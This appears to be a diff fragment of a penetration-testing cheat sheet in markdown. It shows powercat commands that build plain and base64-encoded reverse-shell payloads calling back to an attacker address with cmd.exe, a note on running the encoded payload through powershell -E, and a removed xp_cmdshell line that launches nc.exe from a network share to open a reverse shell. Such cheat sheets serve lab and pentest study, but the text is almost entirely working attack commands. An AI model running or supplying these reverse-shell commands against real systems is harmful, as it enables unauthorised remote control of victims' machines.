@@ -250,9 +250,3 @@ powercat -c 10.11.0.4 -p 443 -e cmd.exe -g > reverseshell.ps1
 powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1
 powershell.exe -E + entired encoded string
 ```
-
-### xp\_cmdshell
-
-```
-xp_cmdshell \\192.168.49.136\share\nc.exe -e cmd.exe 192.168.49.136 80
-```
